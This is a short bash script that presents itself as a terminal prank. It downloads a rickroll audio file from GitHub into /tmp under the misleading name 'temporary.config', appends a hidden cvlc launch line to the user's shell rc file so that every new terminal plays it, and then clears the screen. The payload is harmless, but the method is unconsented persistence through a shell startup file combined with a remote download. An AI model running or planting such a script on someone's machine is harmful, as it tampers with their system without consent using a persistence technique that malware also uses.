#!/bin/bash

video_link="https://raw.githubusercontent.com/AinTEAsports/TerminalPrank/main/rickroll_144p.mp3"
output_filename="/tmp/temporary.config"
shell_configfile=~/.${SHELL##*/}rc


# Verify if the prank is already in shell config file
if [[ $(cat $shell_configfile) == "*nohup cvlc --qt-start-minimized --fullscreen --no-video-title-show --audio --gain 8 --quiet --no-interact --no-osd --video-wallpaper * &*" ]]; then
        echo -e "[~] Prank already in shell config file, exiting the program..."
        sleep 1
        exit 0
fi


# Verify if the shell config file has been found
if [[ ! -f $shell_configfile ]]; then
        echo -e "[/!\] Shell config file has not been found, or it does not exists\n\nClearing the terminal in 2 second
s..."
        sleep 2
        exit 1
fi




# Downloading audio_prank
curl -s $video_link > $output_filename

# Putting te prank into shell config file so when the terminal is started,
# the prank is started too
echo "nohup cvlc --qt-start-minimized --fullscreen --no-video-title-show --audio --gain 8 --quiet --no-interact --no-osd --video-wallpaper $output_filename &" >> $shell_configfile


echo "[+] Operation finished, clearing the terminal in 2 seconds..."
sleep 2
clear

